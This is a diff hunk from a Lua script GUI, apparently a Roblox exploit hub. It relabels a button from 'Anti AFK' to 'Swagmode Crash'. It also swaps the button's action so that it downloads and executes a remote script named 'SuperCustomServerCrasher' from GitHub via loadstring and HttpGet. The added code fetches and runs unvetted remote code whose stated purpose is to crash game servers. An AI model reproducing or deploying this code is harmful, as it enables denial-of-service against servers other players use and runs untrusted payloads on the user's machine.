@@ -652,17 +652,17 @@ end)
 
 UICorner_37.Parent = Headless
 
-AntiAfk.Name = "Anti-Afk"
+AntiAfk.Name = "Swagmode Crash"
 AntiAfk.Parent = MiscTab
 AntiAfk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 AntiAfk.Position = UDim2.new(-0.0026525259, 0, -5.96046448e-08, 0)
 AntiAfk.Size = UDim2.new(0, 165, 0, 41)
 AntiAfk.Font = Enum.Font.Arial
-AntiAfk.Text = "Anti AFK"
+AntiAfk.Text = "Swagmode Crash"
 AntiAfk.TextColor3 = Color3.fromRGB(0, 0, 0)
 AntiAfk.TextSize = 14.000
 AntiAfk.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Fuz1on1/Scripts/main/Anti%20Afk",true))();
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
 
 UICorner_38.Parent = AntiAfk
